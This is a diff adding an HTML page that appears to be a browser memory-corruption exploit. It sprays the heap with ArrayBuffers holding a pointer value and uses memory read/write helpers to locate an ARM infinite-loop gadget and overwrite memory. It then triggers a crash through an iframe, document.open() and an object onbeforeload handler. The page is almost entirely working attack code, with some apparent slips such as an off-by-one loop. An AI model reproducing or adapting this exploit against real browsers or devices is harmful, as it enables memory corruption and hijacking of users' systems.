@@ -1,0 +1,59 @@
+<html>
+<head>
+<script>alert("")</script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script src="inc/log.js"></script>
+<script src="inc/utils.js"></script>
+<script src="inc/memory.js"></script>
+<script>
+try{
+var DataSet = new Uint32Array(520/4);
+var len = 15000;
+var counter = 0;
+var tab = new Array(len);
+for (var j = 0; j <= DataSet.length; j++) {
+			DataSet[j]=uGCProtPtr;
+			}
+
+			
+logAdd("Searching for 0xE7FE (infinite loop)");
+var jPtr = 0x82000000;
+jPtr = findValue16(0xE7FE,(jPtr-0x82000000)/2);
+logAdd(jPtr.toString(16));
+writeMemory(uGCProtPtr,uGCProtPtr);
+for (i=0; i<520;i++) {
+writeMemory(uGCProtPtr+i*4,jPtr|1);
+}
+
+}catch(e){
+logAdd(e)}
+</script>
+    </head>
+    <body>
+	<script>
+	function spray() 
+	{
+	for(var i = 0; i<len; i++) {
+	tab[i] = new ArrayBuffer(520); //1576 bytes
+    }
+	for(var i = 0; i<len; i++) {
+		byteArray = new Uint32Array(tab[i]);
+		byteArray.set(DataSet);
+		delete byteArray;
+    }
+	}
+	
+         function crash() {
+ try{
+  document.getElementsByTagName("iframe")[0].contentWindow.scrollX;
+  document.open();
+  spray();
+  }catch(e){
+  logAdd(e);
+  }
+	
+}
+</script>
+<iframe></iframe><object onbeforeload="crash()">
+    </body>
+</html>
